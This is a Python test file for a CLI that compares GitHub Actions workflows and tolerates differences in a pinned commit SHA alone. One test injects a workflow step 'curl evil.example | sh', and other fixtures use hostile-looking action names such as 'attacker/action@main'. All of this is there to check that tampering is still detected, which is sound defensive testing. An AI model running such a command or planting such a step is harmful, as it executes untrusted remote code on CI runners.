"""CLI fixtures for tolerating a difference in the pinned commit SHA alone."""

import os
from pathlib import Path
import subprocess
import sys
import tempfile
import unittest

import yaml

from drift_compare import WorkflowLoader

ROOT = Path(__file__).resolve().parents[1]
FIXTURES = ROOT / "scripts/fixtures/drift-pin-tolerance"
CHECKS = ".github/workflows/checks.yml"
WORKFLOW = ".github/workflows/demo.yml"
PIN_NOTICE = "differ only in the commit SHA"
COSMETIC_NOTICE = "differ only in comments"
TRANSITION_NOTICE = "Approved Checks PR-concurrency transition"
OLD = "dc2769abcc0fcfbadfc1df54081c1608579ef6b2"
NEW = "46b06cea07f9e64621fdf066ba77ac6915163d43"
ACTION = "step-security/harden-runner"
REUSABLE = "acme/workflows/.github/workflows/build.yml"
FAKE_GIT = FIXTURES / "fake-git"


def reachable_everything():
    """The tests here are about the comparison: every pin they use is on a branch."""
    return {"PATH": f"{FAKE_GIT}{os.pathsep}{os.environ['PATH']}", "GITHUB_TOKEN": "fixture",
            "GH_TOKEN": "", "FAKE_GIT_COMMITS": f"{OLD} {NEW}"}


def workflow(step=f"{ACTION}@{OLD}", job=f"{REUSABLE}@{OLD}", with_uses=f"{ACTION}@{OLD}",
             env_uses=f"{ACTION}@{OLD}", run=f"echo {ACTION}@{OLD}", extra=""):
    """A workflow holding a `uses:` at step and job level, and look-alikes elsewhere."""
    return f"""name: Demo
on: push
env:
  uses: {env_uses}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: {step}
        with:
          uses: {with_uses}
      - run: {run}
{extra}  call:
    uses: {job}
"""


def fixture(name):
    return (FIXTURES / name).read_text()


def run_compare(template, consumer, *, path=WORKFLOW, template_name="skill",
                wrapper=False, actions=False, extra_template_files=None, escape=False,
                environment=None):
    """Run the real CLI; a None consumer leaves that file missing."""
    with tempfile.TemporaryDirectory() as directory:
        base = Path(directory)
        template_root, consumer_root = base / "templates" / template_name, base / "consumer"
        files = {path: (template, consumer)} | (extra_template_files or {})
        for rel, (template_text, consumer_text) in files.items():
            (template_root / rel).parent.mkdir(parents=True, exist_ok=True)
            (consumer_root / rel).parent.mkdir(parents=True, exist_ok=True)
            (template_root / rel).write_text(template_text)
            if consumer_text is not None:
                (consumer_root / rel).write_text(consumer_text)
        if escape:
            outside = base / "outside.yml"
            (consumer_root / path).rename(outside)
            (consumer_root / path).symlink_to(outside)
        command = (["bash", str(ROOT / "scripts/check-drift.sh")] if wrapper else
                   [sys.executable, str(ROOT / "scripts/drift_compare.py")])
        variables = os.environ | {"PYTHONDONTWRITEBYTECODE": "1",
                                  "GITHUB_ACTIONS": "true" if actions else ""}
        variables |= reachable_everything() if environment is None else environment
        return subprocess.run(command + [str(consumer_root), str(template_root)],
                              capture_output=True, text=True, check=False, env=variables)


class PinToleranceTest(unittest.TestCase):
    """Each rule of the tolerance, tolerated and still refused."""

    def assert_pin_only(self, template, consumer, *, path=WORKFLOW, **kwargs):
        result = run_compare(template, consumer, path=path, **kwargs)
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn(PIN_NOTICE, result.stdout)
        self.assertIn(f"≈ {path}", result.stdout)
        self.assertNotIn(COSMETIC_NOTICE, result.stdout)
        self.assertNotIn(TRANSITION_NOTICE, result.stdout)
        return result

    def assert_differing(self, template, consumer, *, path=WORKFLOW, **kwargs):
        result = run_compare(template, consumer, path=path, **kwargs)
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertNotIn(PIN_NOTICE, result.stdout)
        self.assertIn(f"  - {path}", result.stderr)
        return result

    def assert_both_directions_differ(self, one, other, **kwargs):
        self.assert_differing(one, other, **kwargs)
        self.assert_differing(other, one, **kwargs)

    # The real pair behind the failure in t3x-nr-mcp-agent#296.

    def test_real_pair_is_pin_only_in_both_rollout_orders(self):
        consumer, template = fixture("consumer-checks.yml"), fixture("template-checks.yml")
        self.assertIn(f"{ACTION}@{OLD} # v2.22.2", consumer)
        self.assertIn(f"{ACTION}@{NEW} # v2.22.3", template)
        for canonical, other in ((template, consumer), (consumer, template)):
            with self.subTest(canonical=canonical is template):
                self.assert_pin_only(canonical, other, path=CHECKS,
                                     template_name="typo3-extension")

    def test_real_consumer_without_the_concurrency_block_stays_differing(self):
        document = yaml.load(fixture("consumer-checks.yml"), Loader=WorkflowLoader)
        del document["concurrency"]
        self.assert_differing(fixture("template-checks.yml"),
                              yaml.safe_dump(document, sort_keys=False, allow_unicode=True),
                              path=CHECKS, template_name="typo3-extension")

    # Rule 1: only the same action, with a full lowercase SHA on both sides.

    def test_full_sha_of_the_same_action_is_tolerated_at_both_levels(self):
        cases = {"step": {"step": f"{ACTION}@{NEW}"}, "job": {"job": f"{REUSABLE}@{NEW}"},
                 "both": {"step": f"{ACTION}@{NEW}", "job": f"{REUSABLE}@{NEW}"}}
        for name, change in cases.items():
            with self.subTest(name):
                self.assert_pin_only(workflow(), workflow(**change))
                self.assert_pin_only(workflow(**change), workflow())

    def test_action_in_a_subdirectory_keeps_its_path_in_the_identity(self):
        action = "github/codeql-action/init"
        self.assert_pin_only(workflow(step=f"{action}@{OLD}"), workflow(step=f"{action}@{NEW}"))
        self.assert_both_directions_differ(workflow(step=f"{action}@{OLD}"),
                                           workflow(step=f"github/codeql-action/analyze@{NEW}"))
        self.assert_both_directions_differ(workflow(step=f"{action}@{OLD}"),
                                           workflow(step=f"github/codeql-action@{NEW}"))

    def test_another_action_is_differing(self):
        for other in (f"step-security/other@{NEW}", f"evil-fork/harden-runner@{NEW}",
                      f"Step-Security/harden-runner@{NEW}"):
            with self.subTest(other):
                self.assert_both_directions_differ(workflow(step=f"{ACTION}@{OLD}"),
                                                   workflow(step=other))

    def test_reusable_of_another_path_is_differing(self):
        self.assert_both_directions_differ(
            workflow(), workflow(job=f"acme/workflows/.github/workflows/deploy.yml@{NEW}"))

    def test_anything_but_a_full_lowercase_sha_on_either_side_is_differing(self):
        refs = ("v2", "v2.22.3", "main", NEW[:7], NEW[:39], NEW + "0", NEW.upper(),
                "0" * 39 + "g", "sha256:" + NEW)
        for ref in refs:
            with self.subTest(ref=ref):
                self.assert_both_directions_differ(workflow(step=f"{ACTION}@{OLD}"),
                                                   workflow(step=f"{ACTION}@{ref}"))

    def test_two_different_tags_are_differing(self):
        self.assert_both_directions_differ(workflow(step=f"{ACTION}@v2.22.2"),
                                           workflow(step=f"{ACTION}@v2.22.3"))

    def test_main_reusable_is_differing_against_a_sha(self):
        self.assert_both_directions_differ(
            workflow(job=f"netresearch/.github/.github/workflows/ci.yml@{OLD}"),
            workflow(job="netresearch/.github/.github/workflows/ci.yml@main"))

    def test_other_uses_forms_are_differing(self):
        pairs = ((f"./.github/actions/one@{OLD}", f"./.github/actions/one@{NEW}"),
                 (f"docker://acme/image@{OLD}", f"docker://acme/image@{NEW}"),
                 (f"harden-runner@{OLD}", f"harden-runner@{NEW}"))
        for old, new in pairs:
            with self.subTest(old=old):
                self.assert_both_directions_differ(workflow(step=old), workflow(step=new))

    def test_value_with_a_trailing_newline_is_differing(self):
        multiline = "|\n          " + f"{ACTION}@{NEW}"
        document = yaml.load(workflow(step=multiline), Loader=WorkflowLoader)
        self.assertEqual(document["jobs"]["build"]["steps"][0]["uses"], f"{ACTION}@{NEW}\n")
        self.assert_both_directions_differ(workflow(), workflow(step=multiline))
        other_side = "|\n          " + f"{ACTION}@{OLD}"
        self.assert_differing(workflow(step=other_side), workflow(step=multiline))

    # Rule 2: only a `uses` key at job or step level.

    def test_look_alike_strings_outside_job_and_step_uses_are_differing(self):
        for field in ({"with_uses": f"{ACTION}@{NEW}"}, {"env_uses": f"{ACTION}@{NEW}"},
                      {"run": f"echo {ACTION}@{NEW}"}):
            with self.subTest(field):
                self.assert_both_directions_differ(workflow(), workflow(**field))

    def test_look_alike_under_job_level_with_is_differing(self):
        def caller(pin):
            return f"""on: push
jobs:
  call:
    uses: {REUSABLE}@{OLD}
    with:
      uses: {ACTION}@{pin}
"""
        self.assert_both_directions_differ(caller(OLD), caller(NEW))

    def test_uses_keys_in_unrelated_positions_are_differing(self):
        def document(pin):
            return f"""on: push
uses: {ACTION}@{pin}
defaults:
  uses: {ACTION}@{pin}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - run: echo
"""
        self.assert_both_directions_differ(document(OLD), document(NEW))

    def test_step_shared_with_env_through_an_alias_keeps_the_env_difference(self):
        separate = f"""on: push
env:
  uses: {ACTION}@{OLD}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: {ACTION}@{OLD}
"""
        shared = f"""on: push
env: &shared
  uses: {ACTION}@{NEW}
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - *shared
"""
        self.assert_both_directions_differ(separate, shared)

    def test_a_file_outside_the_workflows_directory_is_differing(self):
        path = ".github/settings.yml"
        self.assert_both_directions_differ(workflow(), workflow(step=f"{ACTION}@{NEW}"), path=path)

    def test_unusual_document_shapes_are_differing_without_a_traceback(self):
        shapes = ("- just\n- a list\n", "jobs: none\n", "jobs:\n  build: nothing\n",
                  "jobs:\n  build:\n    steps: nothing\n",
                  "jobs:\n  build:\n    steps: 2\n",
                  "jobs:\n  build:\n    steps:\n      - nothing\n",
                  "jobs:\n  build:\n    steps:\n      - one\n      - two\n",
                  "jobs:\n  build:\n    uses:\n      - not\n      - a string\n")
        for shape in shapes:
            with self.subTest(shape):
                result = self.assert_differing(workflow(), shape)
                self.assertNotIn("Traceback", result.stderr)
                result = self.assert_differing(shape, workflow())
                self.assertNotIn("Traceback", result.stderr)

    # Rule 3: its own category, a notice, and the rest of the file must match.

    def test_pin_with_changed_comment_stays_pin_only(self):
        self.assert_pin_only(workflow().replace(f"{ACTION}@{OLD}\n", f"{ACTION}@{OLD} # v2.22.2\n"),
                             "# consumer prose\n" +
                             workflow(step=f"{ACTION}@{NEW}").replace(f"{ACTION}@{NEW}\n",
                                                                      f"{ACTION}@{NEW} # v2.22.3\n"))

    def test_categories_print_distinct_notices_and_markers(self):
        cosmetic = run_compare(workflow(), "# prose\n" + workflow())
        self.assertEqual(cosmetic.returncode, 0)
        self.assertIn(COSMETIC_NOTICE, cosmetic.stdout)
        self.assertIn(f"~ {WORKFLOW}", cosmetic.stdout)
        self.assertNotIn(PIN_NOTICE, cosmetic.stdout)
        self.assertNotIn("≈", cosmetic.stdout)

        identical = run_compare(workflow(), workflow())
        self.assertEqual(identical.returncode, 0)
        self.assertNotIn(PIN_NOTICE, identical.stdout)

        pinned = self.assert_pin_only(workflow(), workflow(step=f"{ACTION}@{NEW}"))
        self.assertNotIn(f"~ {WORKFLOW}", pinned.stdout)
        self.assertEqual(pinned.stderr, "")

    def test_each_file_is_listed_under_its_own_marker(self):
        other = ".github/workflows/other.yml"
        result = run_compare(workflow(), workflow(step=f"{ACTION}@{NEW}"),
                                  extra_template_files={other: (workflow(), "# prose\n" + workflow())})
        self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
        self.assertIn(f"≈ {WORKFLOW}", result.stdout)
        self.assertNotIn(f"≈ {other}", result.stdout)
        self.assertIn(f"~ {other}", result.stdout)
        self.assertNotIn(f"~ {WORKFLOW}", result.stdout)

    # Rule 4: a pin next to any other difference.

    def test_pin_next_to_another_difference_is_differing(self):
        pinned = workflow(step=f"{ACTION}@{NEW}")
        cases = {
            "condition": pinned.replace("  call:\n", "  call:\n    if: false\n"),
            "name": pinned.replace("name: Demo", "name: Other"),
            "trigger": pinned.replace("on: push", "on: pull_request"),
            "with": pinned.replace(f"uses: {ACTION}@{OLD}\n      - run",
                                   f"uses: {ACTION}@{NEW}\n      - run"),
            "extra job": pinned + "  added:\n    uses: acme/other/.github/workflows/x.yml@main\n",
            "removed step": pinned.replace(f"      - run: echo {ACTION}@{OLD}\n", ""),
            "extra step": workflow(step=f"{ACTION}@{NEW}", extra="      - run: exit 0\n"),
            "renamed job": pinned.replace("  build:", "  renamed:"),
        }
        for name, consumer in cases.items():
            with self.subTest(name):
                self.assertNotEqual(consumer, pinned)
                self.assert_both_directions_differ(workflow(), consumer)

    def test_extra_step_after_a_pin_is_not_dropped(self):
        def steps(pin, *extra):
            lines = "".join(f"      - run: {line}\n" for line in extra)
            return f"""on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: {ACTION}@{pin}
{lines}"""
        self.assert_both_directions_differ(steps(OLD), steps(NEW, "curl evil.example | sh"))

    def test_swapped_steps_are_differing(self):
        def steps(first, second):
            return f"""on: push
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: {first}
      - uses: {second}
"""
        one, other = f"{ACTION}@{OLD}", f"actions/checkout@{NEW}"
        self.assert_both_directions_differ(steps(one, other), steps(other, one))

    # Rule 5: both callers, the exit codes and the other failure paths.

    def test_wrapper_and_workflow_context_agree(self):
        pinned, changed = workflow(step=f"{ACTION}@{NEW}"), workflow(step="attacker/action@main")
        for wrapper, actions in ((True, False), (False, True)):
            with self.subTest(wrapper=wrapper, actions=actions):
                result = self.assert_pin_only(workflow(), pinned, wrapper=wrapper, actions=actions)
                self.assertEqual("::notice::" in result.stdout, actions)
                self.assert_differing(workflow(), changed, wrapper=wrapper, actions=actions)

    def test_notice_does_not_hide_a_missing_file_or_an_escape(self):
        pinned = workflow(step=f"{ACTION}@{NEW}")
        other = ".github/workflows/other.yml"
        result = run_compare(workflow(), pinned,
                                  extra_template_files={other: (workflow(), None)})
        self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
        self.assertIn(PIN_NOTICE, result.stdout)
        self.assertIn(f"  - {other}", result.stderr)
        self.assertEqual(run_compare(workflow(), pinned, escape=True).returncode, 2)


class TransitionInteractionTest(unittest.TestCase):
    """The frozen fingerprints see documents as written, never with adopted pins."""

    @classmethod
    def setUpClass(cls):
        cls.old_b = fixture("consumer-checks.yml")
        cls.new_b = fixture("template-checks.yml")
        cls.old_a = yaml.safe_dump(cls.without_concurrency(cls.old_b), sort_keys=False,
                                   allow_unicode=True)
        cls.new_a = yaml.safe_dump(cls.without_concurrency(cls.new_b), sort_keys=False,
                                   allow_unicode=True)

    @staticmethod
    def without_concurrency(text):
        document = yaml.load(text, Loader=WorkflowLoader)
        del document["concurrency"]
        return document

    def compare(self, template, consumer):
        return run_compare(template, consumer, path=CHECKS, template_name="typo3-extension")

    def test_frozen_pair_stays_a_transition_and_not_a_pin_difference(self):
        for template, consumer in ((self.old_a, self.old_b), (self.old_b, self.old_a)):
            result = self.compare(template, consumer)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertIn(TRANSITION_NOTICE, result.stdout)
            self.assertNotIn(PIN_NOTICE, result.stdout)

    def test_same_concurrency_with_another_pin_is_a_pin_difference(self):
        for template, consumer in ((self.new_b, self.old_b), (self.new_a, self.old_a)):
            result = self.compare(template, consumer)
            self.assertEqual(result.returncode, 0, result.stdout + result.stderr)
            self.assertIn(PIN_NOTICE, result.stdout)
            self.assertNotIn(TRANSITION_NOTICE, result.stdout)

    def test_transition_and_pin_together_are_differing(self):
        for template, consumer in ((self.new_b, self.old_a), (self.old_a, self.new_b),
                                   (self.new_a, self.old_b), (self.old_b, self.new_a)):
            result = self.compare(template, consumer)
            self.assertEqual(result.returncode, 1, result.stdout + result.stderr)
            self.assertNotIn(TRANSITION_NOTICE, result.stdout)
            self.assertNotIn(PIN_NOTICE, result.stdout)


if __name__ == "__main__":
    unittest.main()
